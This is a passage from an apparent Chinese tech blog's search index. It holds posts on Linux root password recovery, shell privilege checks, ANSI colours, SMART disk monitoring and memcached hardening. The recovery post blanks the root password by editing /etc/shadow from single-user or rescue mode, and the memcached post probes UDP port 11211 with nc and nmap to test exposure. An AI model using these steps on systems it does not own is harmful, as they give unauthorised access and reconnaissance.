class="hljs vala"><span class="hljs-meta"># cd /etc</span><span class="hljs-meta"># vi shadow</span></code></pre><p>将以root 开头的一行中“root：”后和下一个“ ：”前的内容删除，<br>第一行将类似于“root ：：****”，保存后重启系统，root 密码置为空。</p><h2 id="2-以LILO-多系统引导程序启动"><a href="#2-以LILO-多系统引导程序启动" class="headerlink" title="2.以LILO 多系统引导程序启动"></a>2.以LILO 多系统引导程序启动</h2><p>当系统以LILO 引导程序启动时，在出现LILO 提示符时输入：</p><pre><code>LILO: linux single</code></pre><p>进入单用户后，更改password 的方法同1。</p><p>4.3.以GRUB 多系统引导程序启动<br>用GRUB引导系统进入单用户步骤：</p><p>(1) 启动GRUB   ，然后键入 e 来编辑；</p><p>(2) 选择以kernel开头的一行，再按e 键，在此行的末尾，按空格键后输入single，以回车键来退出编辑模式；</p><p>(3) 回到了 GRUB 屏幕后，键入 b 来引导进入单用户模式。</p><p>进入单用户后，更改password 的方法同1。</p><h2 id="二、使用Linux-系统安装盘"><a href="#二、使用Linux-系统安装盘" class="headerlink" title="二、使用Linux 系统安装盘"></a>二、使用Linux 系统安装盘</h2><p>如果你既没做系统启动软盘，同时多系统的引导LILO 和GRUB 又被删除(如重装了Windows 系统后)，那么只能使用Linux 系统安装盘来恢复root 的密码。</p><p>用第一张Linux 系统安装盘启动，出现boot 提示符后输入：</p><pre><code>oot: linux rescue</code></pre><p>此时系统进入救援模式，然后根据提示完成：</p><p>　　1.选择语言和键盘格式；</p><p>　　2.选择是否配置网卡，一般系统因网络不需要，所以可以选择否跳过网卡配置；</p><p>　　3 . 选择是否让系统查找硬盘上的Redhat Linux 系统，选择继续；</p><p>　　4.系统显示硬盘上的系统已经被找到，并挂载在/mnt/sysimage 下；</p><p>　　5.进入拯救状态，可重新设置root 的密码：</p><pre><code># chroot/mnt/sysimage (让系统成为根环境)# cd /mnt/sysimage# passwd root</code></pre>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
      <category>os</category>
      
    </categories>
    
    
    <tags>
      
      <tag>grub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>shell编程技巧之判断用户权限</title>
    <link href="/2018/05/14/2018-05-14-judge-root-in-shell/"/>
    <url>/2018/05/14/2018-05-14-judge-root-in-shell/</url>
    
    <content type="html"><![CDATA[<h1 id="shell编程技巧之判断用户权限"><a href="#shell编程技巧之判断用户权限" class="headerlink" title="shell编程技巧之判断用户权限"></a>shell编程技巧之判断用户权限</h1><hr><h2 id="UID-GID-EUID-EGID-SUID-SGID"><a href="#UID-GID-EUID-EGID-SUID-SGID" class="headerlink" title="UID,GID,EUID,EGID,SUID,SGID"></a>UID,GID,EUID,EGID,SUID,SGID</h2><table><thead><tr><th align="center">名称</th><th align="center">介绍</th></tr></thead><tbody><tr><td align="center">UID/GID</td><td align="center">实际用户ID和实际用户组ID,登录时用户对应的ID</td></tr><tr><td align="center">EUDI/EGID</td><td align="center">有效的用户ID和有效的组ID,主要指定了访问目标的权限</td></tr><tr><td align="center">SUID/SGID</td><td align="center">针对文件而讲述的概念,他可以修改当前进程的EUDI/EGID</td></tr></tbody></table><h2 id="linux权限s-t"><a href="#linux权限s-t" class="headerlink" title="linux权限s/t"></a>linux权限s/t</h2><p>这里s/t是针对执行权限来说的.<br>s权限,是为了让使用者临时具有该文件的所属用户或组的执行权限,0755最前面的0表示不使用任何特殊<br>权限，该位上的数字可以是<code>0,1(--t),2(-s-),3(-st),4(s--),5(s-t),6(ss-),7(sst)</code>,那个t权限只针对<br>目录生效，它表示只能让所属主以及root可以删除（重命名/移动）该目录下的文件。比如/tmp目录本<br>来就是任何用户都可以读写，如果别人可以任意删除（重命名/移动）自己的文件，那岂不是很危险。<br>所以这个t权限就是为了解决这个麻烦的。</p><h2 id="判断当前有效用户的权限是否为root"><a href="#判断当前有效用户的权限是否为root" class="headerlink" title="判断当前有效用户的权限是否为root"></a>判断当前有效用户的权限是否为root</h2><pre><code>[[ $EUID -ne 0 ]] &amp;&amp; echo -e &quot;[Error] This script must be run as root!&quot; &amp;&amp; exit 1</code></pre><p>可以使用ANSI转义代码图形再现序列(SGR sequence)输出彩色警示文字</p><pre><code># Colorred=&apos;\033[0;31m&apos;green=&apos;\033[0;32m&apos;yellow=&apos;\033[0;33m&apos;plain=&apos;\033[0m&apos;# Make sure only root can run our script[[ $EUID -ne 0 ]] &amp;&amp; echo -e &quot;[${red}Error${plain}] This script must be run as root!&quot; &amp;&amp; exit 1</code></pre><h2 id="附ANSI转义代码图形再现序列-SGR-sequence"><a href="#附ANSI转义代码图形再现序列-SGR-sequence" class="headerlink" title="附ANSI转义代码图形再现序列(SGR sequence)"></a>附ANSI转义代码图形再现序列(SGR sequence)</h2><h3 id="ANSI-escape-sequences-CSI"><a href="#ANSI-escape-sequences-CSI" class="headerlink" title="ANSI escape sequences - CSI"></a>ANSI escape sequences - CSI</h3><pre><code class="hljs Control">这个序列是由&#96;&#96;&#96;控制字符ESC&#96;&#96;&#96;（通常用&#96;&#96;&#96;^[&#96;&#96;&#96;或&#96;&#96;&#96;&lt;ESC&gt;&#96;&#96;&#96;表示），加上后面的左方括号字符&#96;&#96;&#96;[&#96;&#96;&#96;组成，即&#96;&#96;&#96;^[[&#96;&#96;&#96;。因为大多数文本编辑器将键盘上的ESC键解释为其它功能，所以不能仅敲击ESC键，比如在xterm终端中要输出^[这个字符，你需要先按Ctrl + v，然后按ESC键在bash中，控制字符ESC也支持&#96;&#96;&#96;\e、\033或\x1b&#96;&#96;&#96;三种转义字符的写法，大写字母也行### 设置显示属性 - SGR要控制显示格式，必须使用&#96;&#96;&#96;Set Graphic Rendition&#96;&#96;&#96;, SGR转义序列&#96;&#96;&#96;ESC [ parameters m&#96;&#96;&#96;，其中&#96;&#96;&#96;m</code></pre><p>表示这是SGR序列，<code>parameters</code>是控制代码，可以有多个代码组合，中间用分号<code>;</code>隔开，如果不指定<br>代码<code>ESC [ m</code>相当于<code>ESC [ 0 m</code>（重置所有显示控制属性为默认设置）。</p><p>显示控制代码有3类：</p><pre><code>* 效果控制代码* 前景色控制代码（即字体颜色）* 背景色控制代码</code></pre><h4 id="效果控制代码"><a href="#效果控制代码" class="headerlink" title="效果控制代码"></a>效果控制代码</h4><table><thead><tr><th align="center">代码</th><th align="center">效果</th><th align="center">备注</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">重置所有显示属性为默认设置</td><td align="center">reset all attributes to their defaults</td></tr><tr><td align="center">1</td><td align="center">字体加粗</td><td align="center">set bold</td></tr><tr><td align="center">4</td><td align="center">字体加下划线</td><td align="center">set underscore</td></tr><tr><td align="center">5</td><td align="center">字体闪烁</td><td align="center">set blink</td></tr><tr><td align="center">7</td><td align="center">前景色与背景色调转</td><td align="center">set reverse video</td></tr></tbody></table><h4 id="字体颜色和背景颜色控制代码"><a href="#字体颜色和背景颜色控制代码" class="headerlink" title="字体颜色和背景颜色控制代码"></a>字体颜色和背景颜色控制代码</h4><p>前景色控制代码和背景色控制代码都使用两位数表示，前景色使用3开头，而背景色使用4开头，第二位数字表示具体颜色 <br /><br>字体颜色：30:黑 31:红 32:绿 33:黄 34:蓝色 35:紫色 36:深绿 37:白色 <br /><br>背景：40:黑 41:深红 42:绿 43:黄色 44:蓝色 45:紫色 46:深绿 47:白色。<br /><br>因此，要设置红色前景则发送代码<code>ESC [31m</code>，要设置黄色背景可以使用代码<code>ESC [43m</code>；也可以组合使用，比如要<br>设置字体颜色为红色、背景为黄色、且字体加粗，则使用代码<code>ESC [31;43;1m</code>.</p><h3 id="bash修改字符颜色"><a href="#bash修改字符颜色" class="headerlink" title="bash修改字符颜色"></a>bash修改字符颜色</h3><p>想在bash命令行或脚本中使用带颜色的字符，可以使用echo命令，像发送普通文本一样，将ANSI转义字符序列发送到终端会话：</p><pre><code class="hljs shell">1. 使用`^[`这个字符，你需要先按`Ctrl + v`，然后按`ESC`键（你不能直接复制我的哦~）<span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> ^[[31m红色字体</span>2. 使用bash的ESC转义控制字符，注意echo要使用-e选项，且后面的字符要用引号包括起来，单引号或双引号都可以<span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[31m红色字体"</span> </span><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\033[31m红色字体"</span></span><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\x1b[31m红色字体"</span></span><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\E[31m红色字体"</span>  <span class="hljs-comment"># 大写字母</span></span><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\x1B[31m红色字体"</span></span></code></pre><p>上述代码都可以显示红色字体，但是你会注意到在shell打印出echo命令中的文本之后，新的提示符仍然使用该颜色效果，需要<br>使用重置控制码0（即ESC [0m，）将终端重置为正常显示：</p><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> ^[[31m红色字体^[[0m</span><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[31m红色字体\e[0m"</span></span><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\033[31m红色字体\033[0m"</span></span><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\x1b[31m红色字体\x1b[0m"</span></span></code></pre><p>同时设置多个控制代码，用;隔开，顺序无关：</p><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[31;42;1m绿底红字加粗\e[0m"</span></span><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[1;42;31m绿底红字加粗\e[0m"</span></span><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[1;42;31;5m绿底红字加粗，且字体闪烁\e[0m"</span></span><span class="hljs-meta">#</span><span class="bash"> <span class="hljs-built_in">echo</span> -e <span class="hljs-string">"\e[1;42;31;5;4m绿底红字加粗，且字体闪烁、带下划线\e[0m"</span></span></code></pre><p>参考链接: <a href="http://www.madmalls.com/blog/post/how-to-change-the-output-color-of-echo-in-linux/" target="_blank" rel="noopener">如何修改PS1命令行提示符的颜色</a> </p>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>Linux</category>
      
    </categories>
    
    
    <tags>
      
      <tag>shell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>不同企业规模信息安全关注方向</title>
    <link href="/2018/04/28/2018-04-28-different-company-different-security-standard/"/>
    <url>/2018/04/28/2018-04-28-different-company-different-security-standard/</url>
    
    <content type="html"><![CDATA[<h1 id="不同企业规模信息安全关注方向"><a href="#不同企业规模信息安全关注方向" class="headerlink" title="不同企业规模信息安全关注方向"></a>不同企业规模信息安全关注方向</h1><hr><table><thead><tr><th align="center">公司类型</th><th align="center">创业公司</th><th align="center">大中型企业</th><th align="center">特大型互联网企业</th></tr></thead><tbody><tr><td align="center"></td><td align="center">密码策略</td><td align="center">安全专职团队</td><td align="center">自研安全产品</td></tr><tr><td align="center"></td><td align="center">访问控制</td><td align="center">信息安全管理体系</td><td align="center">大数据分析</td></tr><tr><td align="center"></td><td align="center">漏洞管理</td><td align="center">安全架构</td><td align="center">分工细化的多个安全部门</td></tr><tr><td align="center"></td><td align="center">补丁管理</td><td align="center">入侵检测</td><td align="center">业务和风险驱动</td></tr><tr><td align="center"></td><td align="center">防病毒</td><td align="center">漏洞感知</td><td align="center">数据安全</td></tr><tr><td align="center"></td><td align="center">域控</td><td align="center">代码审计/SDL</td><td align="center">对外输出</td></tr><tr><td align="center"></td><td align="center">安全加固</td><td align="center">业务连续性</td><td align="center">利润中心</td></tr><tr><td align="center"></td><td align="center">安全编码规范</td><td align="center">业务安全</td><td align="center">CSO角色</td></tr><tr><td align="center"></td><td align="center">众测</td><td align="center">自动化工具</td><td align="center">安全标准</td></tr><tr><td align="center"></td><td align="center">公有云部署</td><td align="center">少量开源产品</td><td align="center">生态</td></tr><tr><td align="center">负责部门</td><td align="center">运维部门(兼职)</td><td align="center">安全部门</td><td align="center">安全事业部</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>S.M.A.R.T</title>
    <link href="/2018/03/29/2018-03-29-S_M_A_R_T/"/>
    <url>/2018/03/29/2018-03-29-S_M_A_R_T/</url>
    
    <content type="html"><![CDATA[<h1 id="S-M-A-R-T-技术"><a href="#S-M-A-R-T-技术" class="headerlink" title="S.M.A.R.T 技术"></a>S.M.A.R.T 技术</h1><hr><p>S.M.A.R.T.（Self-Monitoring, Analysis and Reporting Technology）意思是自我监控，分析<br>和报告技术，也常常写成SMART。SMART是计算机硬盘驱动器（HDDs）和固态驱动器（SSDs）的监<br>控系统，用来对许多驱动器可靠性的许多指标进行检测和报告，以便能够预测硬件故障。</p><p>当前多数存储设备内建了S.M.A.R.T.附件来监控、存储和分析其设备操作的健康程度。通过软件<br>搜集温度、重新分配的扇区、寻道错误等状态数据，软件可以用来<br>度量设备等健康状况。当S.M.A.R.T.数据预测到驱动器可能的故障，运行在主机上的软件可能会<br>通知用户复制数据到其他驱动器，避免数据丢失以及可以替换驱动<br>器。</p><h2 id="smartmontools"><a href="#smartmontools" class="headerlink" title="smartmontools"></a>smartmontools</h2><p>smartmontools软件包包含了2个工具程序来分析和监控存储设备：smartctl和smartd。</p><p>设备必须支持SMART功能并且激活每个存储设备的SMART，这样才能有效使用工具。可以使用<br><code>smartctl</code>来检查是否激活了SMART支持，然后运行测试和检查测试结果。<br>另外，可以使用smartd在自动运行测试和进行email通知。</p><h2 id="安装smartmontools"><a href="#安装smartmontools" class="headerlink" title="安装smartmontools"></a>安装smartmontools</h2><ul><li><p>Debian</p><p>  <code>apt-get install smartmontools</code></p></li><li><p>CentOS/RHEL</p><p>  <code>yum install smartmontools</code></p></li></ul><h2 id="smartctl"><a href="#smartctl" class="headerlink" title="smartctl"></a>smartctl</h2><p><code>smartctl</code>是一个命令行工具,控制大多数ATA/SATA和SCSI/SAS硬盘和固态存储内建的SMART”。</p><p><code>--info</code>或<code>-i</code>参数将打印一个设备的信息参数，包括是否支持SMART以及是否激活了该功能。</p><pre><code class="hljs awk">smartctl -i <span class="hljs-regexp">/dev/</span>sda</code></pre><p>显示输出（包括了型号、序列号、Firmware版本、容量、扇区、接口等信息，最后两行参数显<br>示支持SMART）</p><pre><code>=== START OF INFORMATION SECTION ===Model Family:     Seagate Laptop HDDDevice Model:     ST500LT012-1DG142Serial Number:    W3P13ZF9LU WWN Device Id: 5 000c50 06e3a8813Firmware Version: 0002LVM1User Capacity:    500,107,862,016 bytes [500 GB]Sector Sizes:     512 bytes logical, 4096 bytes physicalRotation Rate:    5400 rpmForm Factor:      2.5 inchesDevice is:        In smartctl database [for details use: -P show]ATA Version is:   ATA8-ACS T13/1699-D revision 4SATA Version is:  SATA 3.0, 6.0 Gb/s (current: 3.0 Gb/s)Local Time is:    Thu Mar 29 16:22:02 2018 CSTSMART support is: Available - device has SMART capability.SMART support is: Enabled</code></pre><p>如果设备没有激活SMART，可以使用命令</p><pre><code>smartctl --smart=on /dev/sda</code></pre><p>有可能需要指定设备类型，如 <code>--device=ata</code> 以便通知smartctl设备类型，避免使用SCSI命令<br><code>--smart=off</code>可关闭设备的SMART功能</p><h2 id="运行测试"><a href="#运行测试" class="headerlink" title="运行测试"></a>运行测试</h2><p>有3种类型的自我测试（所有的测试都是用户数据安全的）：</p><blockquote><ul><li>short (检查设备的高概率问题)</li><li>extended （或者称为long测试，将进行完整的磁盘表面快速检查）</li><li>conveyance （在设备的传输过程中标示是否存在损坏）</li></ul></blockquote><p><code>-c</code>参数（或者<code>--capabilities</code>）输出设备支持的测试以及每个测试需要花费的时间</p><pre><code>smartctl -c /dev/sda</code></pre><p>运行结果：</p><pre><code>=== START OF READ SMART DATA SECTION ===General SMART Values:Offline data collection status:  (0x00)    Offline data collection activity                    was never started.                    Auto Offline Data Collection: Disabled.Self-test execution status:      (   0)    The previous self-test routine completed                    without error or no self-test has ever                     been run.Total time to complete Offline data collection:         (    0) seconds.Offline data collectioncapabilities:              (0x73) SMART execute Offline immediate.                    Auto Offline data collection on/off support.                    Suspend Offline collection upon new                    command.                    No Offline surface scan supported.                    Self-test supported.                    Conveyance Self-test supported.                    Selective Self-test supported.SMART capabilities:            (0x0003)    Saves SMART data before entering                    power-saving mode.                    Supports SMART auto save timer.Error logging capability:        (0x01)    Error logging supported.                    General Purpose Logging supported.Short self-test routine recommended polling time:      (   1) minutes.Extended self-test routinerecommended polling time:      ( 103) minutes.Conveyance self-test routinerecommended polling time:      (   2) minutes.SCT capabilities:            (0x1031)    SCT Status supported.                    SCT Feature Control supported.                    SCT Data Table supported.</code></pre><p>使用<code>-t</code>(或者<code>--test=&lt;test_name&gt;</code>)参数来运行一个测试</p><pre><code>smartctl -t short /dev/&lt;device&gt;smartctl -t long /dev/&lt;device&gt;smartctl -t conveyance /dev/&lt;device&gt;</code></pre><h2 id="查看测试结果"><a href="#查看测试结果" class="headerlink" title="查看测试结果"></a>查看测试结果</h2><p>可以使用<code>-H</code>参数来查看设备的健康概况。 “如果设备报告<code>failing health</code>状态，就意味着设备<br>已经故障，或者设备预测自己将在24小时内故障。这种情况下要尽可能快地将设备上的数据导出<br>到安全的存储中”</p><pre><code>smartctl -H /dev/&lt;device&gt;  </code></pre><p>可以列出最近的测试结果以及设备的详细信息</p><pre><code>smartctl -l selftest /dev/&lt;device&gt;smartctl -a /dev/&lt;device&gt;</code></pre><h2 id="快速测试案例"><a href="#快速测试案例" class="headerlink" title="快速测试案例"></a>快速测试案例</h2><p>启动一个短暂的自测试</p><pre><code>sudo smartctl -t short /dev/sda</code></pre><p>如果要中断测试（没有必要的话不要自行中断命令）</p><pre><code>smartctl -X</code></pre><p>短暂自测试大约2分钟，然后用下面的命令查看测试结果</p><pre><code>sudo smartctl -l selftest /dev/sda</code></pre><p>显示结果类似</p><p>直接查看磁盘的健康状况</p><pre><code>smartctl --health /dev/sda</code></pre><p>显示</p><pre><code>=== START OF READ SMART DATA SECTION ===SMART Health Status: OK</code></pre><p>输出详细的设备信息</p><pre><code>smartctl -a /dev/sda</code></pre><p>输出结果类似</p><h2 id="smartd"><a href="#smartd" class="headerlink" title="smartd"></a>smartd</h2><p><code>smartd</code> daemon监控SMART状态，并在发生问题时邮件通知。这个服务可以通过systemd管理，<br>并且使用<code>/etc/smartd.conf</code>配置文件。不过这个配置文件非常晦涩难懂，详细配置可以参<br>考<code>man 5 smartd.conf</code>或者<a href="https://www.smartmontools.org/browser/trunk/smartmontools/smartd.conf.5.in" target="_blank" rel="noopener">smartd.conf info</a></p><h2 id="管理smartd服务"><a href="#管理smartd服务" class="headerlink" title="管理smartd服务"></a>管理smartd服务</h2><p>启动、检查状态、以及激活自启动和查看最近的日志</p><pre><code>systemctl start smartdsystemctl status smartdsystemctl enable smartdjournalctl -u smartd</code></pre><h2 id="定义监控的设备"><a href="#定义监控的设备" class="headerlink" title="定义监控的设备"></a>定义监控的设备</h2><p>要监控所有可能SMART错误，则配置<code>/etc/smartd.conf</code>（在CentOS 7是<code>/etc/smartmontools/smartd.conf</code>）</p><pre><code>DEVICESCAN -a</code></pre><p>如果要只监控指定的磁盘，例如</p><pre><code>/dev/sda -a/dev/sdb -a</code></pre><p>也可以对外接的磁盘（如通过USB连接的备份用磁盘），需要通知SMARTd设备的UUID，这是因为每次<br>重启设备的<code>/dev/sdX</code>可能变化</p><p>要获取需要监控的磁盘的UUID，可以使用<code>ls -lah /dev/disk/by-uuid/</code> 来查看需要监控的磁盘。<br>以下配置在smartd.conf中的配置就是针对USB磁盘</p><pre><code>/dev/disk/by-uuid/820cdd8a-866a-444d-833c-1edb0f4becac -a</code></pre><h2 id="使用电子邮件通知潜在的问题"><a href="#使用电子邮件通知潜在的问题" class="headerlink" title="使用电子邮件通知潜在的问题"></a>使用电子邮件通知潜在的问题</h2><p>要在故障或新的错误发生时通知，使用<code>-m</code>参数</p><pre><code>DEVICESCAN -m address@domain.com</code></pre><p>要发送给外部的email地址，需要确保系统有MTA(Mail Transport Agent)或者MUA(Mail User Agent)<br>并且已经正确配置。通常MTU是sendmail和Postfix。</p><p>如果设置了<code>-M test</code>就会在smartd服务启动时发送一个测试邮件</p><pre><code>DEVICESCAN -m address@domain.com -M test</code></pre><p>由于电子邮件投递需要很长时间，而通常期望硬盘故障时立即被通知到以便采取措施。则可以定义<br>执行一个脚本来替代email</p><pre><code>DEVICESCAN -m address@domain.com -M exec /usr/local/bin/smartdnotify</code></pre><p>CentOS默认配置</p><p>检查了CentOS 7默认配置的<code>/etc/smartmontools/smartd.conf</code>，配置内容实际只有一行</p><pre><code>DEVICESCAN -H -m root -M exec /usr/libexec/smartmontools/smartdnotify -n standby,10,q</code></pre><p>这里通知是发送给系统的root用户，并且执行了脚本<code>/usr/libexec/smartmontools/smartdnotify</code> 这<br>个脚本实现了email通知，同时将消息写到终端上</p><pre><code class="hljs bash"><span class="hljs-meta">#! /bin/sh</span><span class="hljs-comment"># Send mail</span><span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$SMARTD_MESSAGE</span>"</span> | mail -s <span class="hljs-string">"<span class="hljs-variable">$SMARTD_FAILTYPE</span>"</span> <span class="hljs-string">"<span class="hljs-variable">$SMARTD_ADDRESS</span>"</span><span class="hljs-comment"># Notify desktop user</span>MESSAGE=<span class="hljs-string">"WARNING: Your hard drive is failing"</span><span class="hljs-comment"># direct write to terminals, do not use 'wall', because we don't want its ugly header</span><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> $(who | awk <span class="hljs-string">'&#123; print $2; &#125;'</span> | grep -e <span class="hljs-string">'^tty'</span> -e <span class="hljs-string">'^pts/'</span>)<span class="hljs-keyword">do</span>  <span class="hljs-built_in">echo</span> <span class="hljs-string">"<span class="hljs-variable">$MESSAGE</span></span><span class="hljs-string"><span class="hljs-variable">$SMARTD_MESSAGE</span>"</span> &gt;/dev/<span class="hljs-variable">$t</span> 2&gt;/dev/null ||:<span class="hljs-keyword">done</span></code></pre><h2 id="电源管理"><a href="#电源管理" class="headerlink" title="电源管理"></a>电源管理</h2><p>可以用smartd来处理磁盘的低电压模式，这样可以通过smartd来响应SMART命令，磁盘转速。没<br>有这个参数，磁盘可能在低电压情况下仍然高速旋转：</p><pre><code>DEVICESCAN -n standby,15,q</code></pre><blockquote><p>详细参考 <a href="http://www.smartmontools.org/wiki/Powermode" target="_blank" rel="noopener">smartmontools wiki</a></p></blockquote><h2 id="周期自测"><a href="#周期自测" class="headerlink" title="周期自测"></a>周期自测</h2><p>smartd可以告诉磁盘定期执行自检，以下配置设置磁盘每天早上2-3点进行short self-test，在<br>每个周六的早上3-4点进行详细自测</p><pre><code>DEVICESCAN -s (S/../.././02|L/../../6/03)</code></pre><h2 id="温度改变时告警"><a href="#温度改变时告警" class="headerlink" title="温度改变时告警"></a>温度改变时告警</h2><p>smartd可以跟踪磁盘问题并且在磁盘温度太快升高或者达到阀值时高进。以下配置在发生4度温度变化，或者温度达到35度，进行日志，在温度达到40度时日志和邮件告警</p><pre><code>DEVICESCAN -W 4,35,40</code></pre><p>可以使用命令检查当前磁盘温度<code>smartctl -A /dev/&lt;device&gt; | grep Temperature_Celsius</code></p><h2 id="完整的smartd-conf配置"><a href="#完整的smartd-conf配置" class="headerlink" title="完整的smartd.conf配置"></a>完整的smartd.conf配置</h2><p>以下配置将上述所有配置集成</p><p>DEVICESCAN (smartd scans for disks and monitors all it finds)</p><pre><code>-a (monitor all attributes)-o on (enable automatic online data collection)-S on (enable automatic attribute autosave)-n standby,q (do not check if disk is in standby, and suppress log message to that effect so as not to cause a write to disk)-s ... (schedule short and long self-tests)-W ... (monitor temperature)-m ... (mail alerts)</code></pre><p>配置如下</p><pre><code>DEVICESCAN -a -o on -S on -n standby,q -s (S/../.././02|L/../../6/03) -W 4,35,40 -m &lt;username or email&gt;</code></pre><p>这个配置非常完善，可参考</p><h2 id="GSmartControl图形管理工具"><a href="#GSmartControl图形管理工具" class="headerlink" title="GSmartControl图形管理工具"></a>GSmartControl图形管理工具</h2><p><strong>GSmartControl</strong>是smartctl的的图形前端，显示所有的SMART数值，并且高亮显示那些旧值或者<br>即将故障，可以按照需要运行测试</p><pre><code>GSmartControl main window</code></pre><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><pre><code>[Wikipedia: S.M.A.R.T.](https://en.wikipedia.org/wiki/S.M.A.R.T.)[archlinux: S.M.A.R.T. ](https://wiki.archlinux.org/index.php/S.M.A.R.T.)- 本文主要参考[Monitoring Hard Disks with SMART](http://www.linuxjournal.com/magazine/monitoring-hard-disks-smart)[Get the disk health status with SMART monitor tools on Debian and Ubuntu Linux](http://www.linuxjournal.com/magazine/monitoring-hard-disks-smart)[Using smartctl to get SMART status information on your hard drives](http://www.techrepublic.com/blog/linux-and-open-source/using-smartctl-to-get-smart-status-information-on-your-hard-drives/)[ubuntu: Smartmontools](https://help.ubuntu.com/community/Smartmontools) - 本文主要参考，提供了监控个人电脑和服务器的脚本以及处理经验[SMART tests with smartctl](https://www.thomas-krenn.com/en/wiki/SMART_tests_with_smartctl)[Monitoring Hard Drive Health on Linux with smartmontools](https://blog.shadypixel.com/monitoring-hard-drive-health-on-linux-with-smartmontools/)</code></pre><p><strong>文章参考</strong><br><a href="https://huataihuang.gitbooks.io/cloud-atlas/content/storage/das/smart.html" target="_blank" rel="noopener">https://huataihuang.gitbooks.io/cloud-atlas/content/storage/das/smart.html</a></p><p><strong>文章参考</strong><br><a href="https://huataihuang.gitbooks.io/cloud-atlas/content/storage/das/smart.html" target="_blank" rel="noopener">https://huataihuang.gitbooks.io/cloud-atlas/content/storage/das/smart.html</a></p>]]></content>
    
    
    <categories>
      
      <category>OS</category>
      
    </categories>
    
    
    <tags>
      
      <tag>i/o</tag>
      
      <tag>disk</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>memcached 安全加固</title>
    <link href="/2018/03/02/2018-03-02-memcaced-security-reinforcement/"/>
    <url>/2018/03/02/2018-03-02-memcaced-security-reinforcement/</url>
    
    <content type="html"><![CDATA[<h1 id="Memcached安全加固"><a href="#Memcached安全加固" class="headerlink" title="Memcached安全加固"></a>Memcached安全加固</h1><hr><h2 id="Memcached用户"><a href="#Memcached用户" class="headerlink" title="Memcached用户"></a>Memcached用户</h2><p>如果您正在使用memcached，请在不使用UDP的情况下禁用UDP。在memcached启动时，您可以指定<code>--listen 127.0.0.1</code>仅侦听本地主机并<code>-U 0</code>完全禁用UDP。默认情况下，memcached侦听<strong>INADDR_ANY</strong>，并在UDP支持ENABLED的情况下运行。文档：<br><a href="https://github.com/memcached/memcached/wiki/ConfiguringServer#udp" target="_blank" rel="noopener">https://github.com/memcached/memcached/wiki/ConfiguringServer#udp</a><br>运行以下命令可以轻松测试服务器是否易受攻击：</p><pre><code>$ echo -en &quot;\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n&quot; | nc -q1 -u 127.0.0.1 11211STAT pid 21357STAT uptime 41557034STAT time 1519734962...</code></pre><p>如果您看到非空的响应（如上所示），则您的服务器很脆弱。</p><h2 id="系统管理员"><a href="#系统管理员" class="headerlink" title="系统管理员"></a>系统管理员</h2><p>请确保您的memcached服务器从互联网受到防火墙限制！为了测试它们是否可以使用UDP访问，运行nmap来检测：</p><pre><code>$ nmap TARGET -p 11211 -sU -sS --script memcached-infoStarting Nmap 7.30 ( https://nmap.org ) at 2018-02-27 12:44 UTCNmap scan report for xxxxHost is up (0.011s latency).PORT      STATE         SERVICE11211/tcp open          memcache| memcached-info:|   Process ID           21357|   Uptime               41557524 seconds|   Server time          2018-02-27T12:44:12|   Architecture         64 bit|   Used CPU (user)      36235.480390|   Used CPU (system)    285883.194512|   Current connections  11|   Total connections    107986559|   Maximum connections  1024|   TCP Port             11211|   UDP Port             11211|_  Authentication       no11211/udp open|filtered memcache</code></pre><h2 id="互联网服务提供商"><a href="#互联网服务提供商" class="headerlink" title="互联网服务提供商"></a>互联网服务提供商</h2><p><strong>分布式缓存反射器</strong><br>为了在未来击败此类攻击，我们需要修复易受攻击的协议以及IP欺骗。只要互联网上允许IP欺骗，我们就会陷入困境。<br>通过跟踪这些攻击背后的人来帮助我们。我们必须知道谁不是有问题的memcached服务器，而是首先向他们发送查询的人。没有你的帮助，我们无法做到这一点！</p><h2 id="开发商"><a href="#开发商" class="headerlink" title="开发商"></a>开发商</h2><p>请停止使用UDP。如果您必须，请不要默认启用它。如果你不知道什么是放大攻击，我特此禁止你<strong>SOCK_DGRAM</strong>在编辑器中输入内容。<br>我们已经遇到过这么多次了。DNS，NTP，Chargen，SSDP和现在的memcached。如果使用UDP，则必须始终以严格较小的数据包大小响应请求。否则你的协议将被滥用。另外请记住，人们会忘记设置防火墙。做一个开发人员。不要发明缺乏任何类型认证的基于UDP的协议。</p><h2 id="加固方式总结"><a href="#加固方式总结" class="headerlink" title="加固方式总结"></a>加固方式总结</h2><h3 id="配置访问控制。"><a href="#配置访问控制。" class="headerlink" 